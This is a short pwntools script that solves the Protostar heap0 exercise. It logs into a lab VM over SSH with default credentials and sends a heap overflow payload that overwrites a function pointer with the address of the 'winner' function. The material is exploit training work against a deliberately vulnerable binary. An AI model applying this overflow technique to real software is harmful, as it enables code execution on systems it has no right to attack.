#!/usr/bin/python3
from pwn import *
# you may need to change port for your machine
session = ssh(host='172.16.17.27', user='user', password='user', port=22)
# the variable target is at memory location:
# winner is at
winner ='\\x64\\x84\\x04\\x08'
# we know the struct data only allocated 64 bytes on the heap
# f is 8 bytes
# so we can overflow both addresses and to f->fp
io = session.run('bash', env={"PS1":""})
if(io):
    io.sendline('/opt/protostar/bin/heap0 $(python -c \'print \"a\"*72+\"'+winner+'\"\')')
    log.info(io.recvline(timeout=2).decode('utf-8'))
    log.info(io.recvline(timeout=2).decode('utf-8'))
else:
    print("Error running sh")
session.close()
